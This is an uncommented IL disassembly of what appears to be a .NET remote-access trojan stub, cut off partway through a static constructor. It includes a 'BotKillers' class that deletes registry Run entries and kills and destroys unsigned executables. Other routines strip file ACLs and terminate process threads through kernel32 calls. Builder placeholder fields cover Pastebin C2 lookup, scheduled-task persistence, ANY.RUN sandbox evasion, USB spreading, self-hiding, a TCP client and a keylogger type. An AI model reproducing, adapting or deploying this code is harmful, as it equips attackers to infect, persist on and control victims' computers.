      IL_0014:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_0019:  ldarg.0
      IL_001a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_001f:  stloc.0
      IL_0020:  ldloc.0
      IL_0021:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0026:  stloc.1
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.2
      IL_0029:  br         IL_00f9

      IL_002e:  ldloc.1
      IL_002f:  ldloc.2
      IL_0030:  ldelem.ref
      IL_0031:  stloc.3
      .try
      {
        IL_0032:  ldloc.0
        IL_0033:  ldloc.3
        IL_0034:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
        IL_0039:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_003e:  stloc.s    V_4
        IL_0040:  ldloc.s    V_4
        IL_0042:  ldstr      "-"
        IL_0047:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_004c:  brfalse.s  IL_008f

        IL_004e:  ldloc.s    V_4
        IL_0050:  ldstr      "\""
        IL_0055:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_005a:  brfalse.s  IL_006e

        IL_005c:  ldloc.s    V_4
        IL_005e:  ldstr      "\""
        IL_0063:  ldsfld     string [mscorlib]System.String::Empty
        IL_0068:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                              string)
        IL_006d:  pop
        IL_006e:  nop
        .try
        {
          IL_006f:  ldloc.s    V_4
          IL_0071:  ldstr      " -"
          IL_0076:  ldc.i4.m1
          IL_0077:  ldc.i4.0
          IL_0078:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                    string,
                                                                                                    int32,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
          IL_007d:  ldc.i4.0
          IL_007e:  ldelem.ref
          IL_007f:  stloc.s    V_4
          IL_0081:  leave.s    IL_008f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008d:  leave.s    IL_008f

        }  // end handler
        IL_008f:  ldloc.s    V_4
        IL_0091:  ldstr      "\""
        IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_009b:  brfalse.s  IL_00b8

        IL_009d:  ldloc.s    V_4
        IL_009f:  ldc.i4.1
        IL_00a0:  newarr     [mscorlib]System.Char
        IL_00a5:  dup
        IL_00a6:  ldc.i4.0
        IL_00a7:  ldc.i4.s   34
        IL_00a9:  stelem.i2
        IL_00aa:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
        IL_00af:  ldc.i4.1
        IL_00b0:  ldelem.ref
        IL_00b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_00b6:  stloc.s    V_4
        IL_00b8:  ldloc.s    V_4
        IL_00ba:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_00bf:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_00c4:  brtrue.s   IL_00e7

        IL_00c6:  ldarg.1
        IL_00c7:  ldloc.3
        IL_00c8:  ldarg.0
        IL_00c9:  ldloc.s    V_4
        IL_00cb:  call       void BotKillers::RemoveKey(int32,
                                                        string,
                                                        string,
                                                        string)
        IL_00d0:  ldloc.s    V_4
        IL_00d2:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
        IL_00d7:  brtrue.s   IL_00e7

        IL_00d9:  ldloc.s    V_4
        IL_00db:  call       void BotKillers::TerminateProcessPath(string)
        IL_00e0:  ldloc.s    V_4
        IL_00e2:  call       void BotKillers::DestroyFile(string)
        IL_00e7:  leave.s    IL_00f5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f3:  leave.s    IL_00f5

      }  // end handler
      IL_00f5:  ldloc.2
      IL_00f6:  ldc.i4.1
      IL_00f7:  add.ovf
      IL_00f8:  stloc.2
      IL_00f9:  ldloc.2
      IL_00fa:  ldloc.1
      IL_00fb:  ldlen
      IL_00fc:  conv.i4
      IL_00fd:  blt        IL_002e

      IL_0102:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0104:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  ret
  } // end of method BotKillers::StartupFucker

  .method public static void  RemoveKey(int32 Reg,
                                        string file,
                                        string reglocation,
                                        string FileLocation) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]Microsoft.Win32.RegistryKey V_1,
             class [mscorlib]Microsoft.Win32.RegistryKey V_2)
    .try
    {
      IL_0000:  ldarg.2
      IL_0001:  stloc.0
      IL_0002:  ldnull
      IL_0003:  stloc.1
      IL_0004:  ldarg.0
      IL_0005:  ldc.i4.1
      IL_0006:  bne.un.s   IL_0017

      IL_0008:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0014:  stloc.1
      IL_0015:  br.s       IL_0024

      IL_0017:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_001c:  ldloc.0
      IL_001d:  ldc.i4.1
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0023:  stloc.1
      IL_0024:  ldloc.1
      IL_0025:  stloc.2
      .try
      {
        IL_0026:  ldloc.1
        IL_0027:  brfalse.s  IL_0030

        IL_0029:  ldloc.1
        IL_002a:  ldarg.1
        IL_002b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
        IL_0030:  leave.s    IL_003c

      }  // end .try
      finally
      {
        IL_0032:  ldloc.2
        IL_0033:  brfalse.s  IL_003b

        IL_0035:  ldloc.2
        IL_0036:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_003b:  endfinally
      }  // end handler
      IL_003c:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ret
  } // end of method BotKillers::RemoveKey

  .method public static void  DestroyFile(string path) cil managed noinlining nooptimization
  {
    // Code size       157 (0x9d)
    .maxstack  6
    .locals init (class [mscorlib]System.Random V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0006:  brfalse    IL_008e

      IL_000b:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0010:  stloc.0
      .try
      {
        IL_0011:  ldarg.0
        IL_0012:  call       void BotKillers::AllowAccess(string)
        IL_0017:  call       class My.MyComputer My.MyProject::get_Computer()
        IL_001c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
        IL_0021:  ldarg.0
        IL_0022:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0027:  ldloc.0
        IL_0028:  ldc.i4     0x2710
        IL_002d:  ldc.i4     0x15f90
        IL_0032:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                          int32)
        IL_0037:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0041:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::MoveFile(string,
                                                                                                                             string)
        IL_0046:  ldarg.0
        IL_0047:  ldsfld     string [mscorlib]System.String::Empty
        IL_004c:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                         string)
        IL_0051:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FreeFile()
        IL_0056:  ldarg.0
        IL_0057:  ldc.i4.1
        IL_0058:  ldc.i4.m1
        IL_0059:  ldc.i4.0
        IL_005a:  ldc.i4.m1
        IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FileOpen(int32,
                                                                                                    string,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenMode,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenAccess,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenShare,
                                                                                                    int32)
        IL_0060:  ldarg.0
        IL_0061:  call       void BotKillers::KillFile(string)
        IL_0066:  leave.s    IL_008e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_006d:  ldarg.0
        IL_006e:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
        IL_0073:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
        IL_0078:  stloc.1
        IL_0079:  ldloc.1
        IL_007a:  ldc.i4.1
        IL_007b:  ldc.i4.0
        IL_007c:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                           bool)
        IL_0081:  ldloc.1
        IL_0082:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
        IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008c:  leave.s    IL_008e

      }  // end handler
      IL_008e:  leave.s    IL_009c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009a:  leave.s    IL_009c

    }  // end handler
    IL_009c:  ret
  } // end of method BotKillers::DestroyFile

  .method public static bool  IsAdmin() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1)
    .try
    {
      IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
      IL_000c:  ldc.i4     0x220
      IL_0011:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
      IL_0016:  stloc.0
      IL_0017:  leave.s    IL_0027

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0025:  leave.s    IL_0027

    }  // end handler
    IL_0027:  ldloc.0
    IL_0028:  ret
  } // end of method BotKillers::IsAdmin

  .method public static void  AllowAccess(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.1
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::AllowAccess

  .method public static void  TerminateProcessPath(string Path) cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process V_6)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0006:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000b:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0010:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0015:  brtrue     IL_00b5

      IL_001a:  ldarg.0
      IL_001b:  ldstr      "\\"
      IL_0020:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0025:  brfalse.s  IL_0057

      IL_0027:  ldarg.0
      IL_0028:  ldstr      "\\"
      IL_002d:  ldc.i4.m1
      IL_002e:  ldc.i4.0
      IL_002f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_0034:  stloc.1
      IL_0035:  ldc.i4.0
      IL_0036:  stloc.2
      IL_0037:  br.s       IL_0051

      IL_0039:  ldloc.1
      IL_003a:  ldloc.2
      IL_003b:  ldelem.ref
      IL_003c:  stloc.3
      IL_003d:  ldloc.3
      IL_003e:  ldstr      ".exe"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_004d

      IL_004a:  ldloc.3
      IL_004b:  starg.s    Path
      IL_004d:  ldloc.2
      IL_004e:  ldc.i4.1
      IL_004f:  add.ovf
      IL_0050:  stloc.2
      IL_0051:  ldloc.2
      IL_0052:  ldloc.1
      IL_0053:  ldlen
      IL_0054:  conv.i4
      IL_0055:  blt.s      IL_0039

      IL_0057:  ldarg.0
      IL_0058:  ldstr      ".exe"
      IL_005d:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0062:  brfalse.s  IL_0076

      IL_0064:  ldarg.0
      IL_0065:  ldstr      ".exe"
      IL_006a:  ldsfld     string [mscorlib]System.String::Empty
      IL_006f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0074:  starg.s    Path
      IL_0076:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_007b:  stloc.0
      IL_007c:  ldloc.0
      IL_007d:  ldlen
      IL_007e:  conv.i4
      IL_007f:  ldc.i4.1
      IL_0080:  sub.ovf
      IL_0081:  stloc.s    V_4
      IL_0083:  ldc.i4.0
      IL_0084:  stloc.s    V_5
      IL_0086:  br.s       IL_00af

      IL_0088:  ldloc.0
      IL_0089:  ldloc.s    V_5
      IL_008b:  ldelem.ref
      IL_008c:  stloc.s    V_6
      IL_008e:  ldloc.s    V_6
      IL_0090:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0095:  ldarg.0
      IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_009b:  brfalse.s  IL_00a9

      IL_009d:  ldloc.s    V_6
      IL_009f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_00a4:  call       void BotKillers::TerminateProcess(int32)
      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4.1
      IL_00ac:  add.ovf
      IL_00ad:  stloc.s    V_5
      IL_00af:  ldloc.s    V_5
      IL_00b1:  ldloc.s    V_4
      IL_00b3:  ble.s      IL_0088

      IL_00b5:  leave.s    IL_00c3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c1:  leave.s    IL_00c3

    }  // end handler
    IL_00c3:  ret
  } // end of method BotKillers::TerminateProcessPath

  .method public static void  TerminateProcess(int32 PID) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [mscorlib]System.Collections.IEnumerator V_1,
             class [System]System.Diagnostics.ProcessThread V_2,
             native int V_3)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  stloc.0
      IL_0007:  ldloc.0
      IL_0008:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000d:  ldsfld     string [mscorlib]System.String::Empty
      IL_0012:  ldc.i4.0
      IL_0013:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0018:  brfalse.s  IL_0084

      .try
      {
        IL_001a:  ldloc.0
        IL_001b:  callvirt   instance class [System]System.Diagnostics.ProcessThreadCollection [System]System.Diagnostics.Process::get_Threads()
        IL_0020:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.ReadOnlyCollectionBase::GetEnumerator()
        IL_0025:  stloc.1
        IL_0026:  br.s       IL_0066

        IL_0028:  ldloc.1
        IL_0029:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
        IL_002e:  castclass  [System]System.Diagnostics.ProcessThread
        IL_0033:  stloc.2
        IL_0034:  ldc.i4.3
        IL_0035:  ldc.i4.1
        IL_0036:  ldloc.2
        IL_0037:  callvirt   instance int32 [System]System.Diagnostics.ProcessThread::get_Id()
        IL_003c:  conv.ovf.u4
        IL_003d:  call       native int BotKillers::OpenThread(valuetype BotKillers/ThreadAccess,
                                                               bool,
                                                               uint32)
        IL_0042:  stloc.3
        IL_0043:  ldloc.3
        IL_0044:  ldsfld     native int [mscorlib]System.IntPtr::Zero
        IL_0049:  call       bool [mscorlib]System.IntPtr::op_Inequality(native int,
                                                                         native int)
        IL_004e:  brfalse.s  IL_0066

        IL_0050:  ldloc.3
        IL_0051:  call       int32 BotKillers::SuspendThread(native int)
        IL_0056:  pop
        IL_0057:  ldloc.3
        IL_0058:  ldc.i4.1
        IL_0059:  call       bool BotKillers::TerminateThread(native int,
                                                              uint32)
        IL_005e:  pop
        IL_005f:  ldloc.3
        IL_0060:  call       bool BotKillers::CloseHandle(native int)
        IL_0065:  pop
        IL_0066:  ldloc.1
        IL_0067:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
        IL_006c:  brtrue.s   IL_0028

        IL_006e:  leave.s    IL_0084

      }  // end .try
      finally
      {
        IL_0070:  ldloc.1
        IL_0071:  isinst     [mscorlib]System.IDisposable
        IL_0076:  brfalse.s  IL_0083

        IL_0078:  ldloc.1
        IL_0079:  isinst     [mscorlib]System.IDisposable
        IL_007e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0083:  endfinally
      }  // end handler
      IL_0084:  leave.s    IL_0092

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0090:  leave.s    IL_0092

    }  // end handler
    IL_0092:  ret
  } // end of method BotKillers::TerminateProcess

  .method private static pinvokeimpl("kernel32.dll" lasterr winapi) 
          bool  CloseHandle(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          native int  OpenThread(valuetype BotKillers/ThreadAccess dwDesiredAccess,
                                 bool bInheritHandle,
                                 uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" lasterr winapi) 
          int32  SuspendThread(native int hThread) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32.dll" winapi) 
          bool  TerminateThread(native int hThread,
                                uint32 dwExitCode) cil managed preservesig
  {
  }
} // end of class BotKillers

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public TernaryRasterOperations
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCCOPY = int32(0x00CC0020)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCPAINT = int32(0x00EE0086)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCAND = int32(0x008800C6)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCINVERT = int32(0x00660046)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCERASE = int32(0x00440328)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCCOPY = int32(0x00330008)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCERASE = int32(0x001100A6)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGECOPY = int32(0x00C000CA)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGEPAINT = int32(0x00BB0226)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATCOPY = int32(0x00F00021)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATPAINT = int32(0x00FB0A09)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATINVERT = int32(0x005A0049)
    .field public static literal valuetype j.OK/TernaryRasterOperations DSTINVERT = int32(0x00550009)
    .field public static literal valuetype j.OK/TernaryRasterOperations BLACKNESS = int32(0x00000042)
    .field public static literal valuetype j.OK/TernaryRasterOperations WHITENESS = int32(0x00FF0062)
  } // end of class TernaryRasterOperations

  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .field private class [mscorlib]System.Threading.Thread MouseThread
  .field private static literal int32 SRCCOPY = int32(0x00CC0020)
  .field private class [mscorlib]System.Random r
  .field public static bool PasteE
  .field public static string PASTEBIN
  .field public static bool Sched
  .field public static string SCHEDNAME
  .field public static bool ANYRUN
  .field public static string Bypass
  .field public static bool TaskMGR
  .field public static bool KProc
  .field public static string Proc
  .field public static string SLP
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .field public static bool BOT_KILL
  .field public static bool HIDE_ME
  .field public static bool Persis
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       446 (0x1be)
    .maxstack  1
    IL_0000:  ldstr      "[PasteE]"
    IL_0005:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_000a:  stsfld     bool j.OK::PasteE
    IL_000f:  ldstr      "[PASTEBIN]"
    IL_0014:  stsfld     string j.OK::PASTEBIN
    IL_0019:  ldstr      "[Sched]"
    IL_001e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0023:  stsfld     bool j.OK::Sched
    IL_0028:  ldstr      "[SCHEDNAME]"
    IL_002d:  stsfld     string j.OK::SCHEDNAME
    IL_0032:  ldstr      "[ANYRUN]"
    IL_0037:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_003c:  stsfld     bool j.OK::ANYRUN
    IL_0041:  ldstr      "[Bypass]"
    IL_0046:  stsfld     string j.OK::Bypass
    IL_004b:  ldstr      "[TaskMGR]"
    IL_0050:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0055:  stsfld     bool j.OK::TaskMGR
    IL_005a:  ldstr      "[KProc]"
    IL_005f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0064:  stsfld     bool j.OK::KProc
    IL_0069:  ldstr      "[Proc]"
    IL_006e:  stsfld     string j.OK::Proc
    IL_0073:  ldstr      "[SLP]"
    IL_0078:  stsfld     string j.OK::SLP
    IL_007d:  ldc.i4     0x1401
    IL_0082:  newarr     [mscorlib]System.Byte
    IL_0087:  stsfld     uint8[] j.OK::b
    IL_008c:  ldstr      "[BD]"
    IL_0091:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0096:  stsfld     bool j.OK::BD
    IL_009b:  ldnull
    IL_009c:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00a1:  ldc.i4.0
    IL_00a2:  stsfld     bool j.OK::Cn
    IL_00a7:  ldstr      "[DR]"
    IL_00ac:  stsfld     string j.OK::DR
    IL_00b1:  ldstr      "[EXE]"
    IL_00b6:  stsfld     string j.OK::EXE
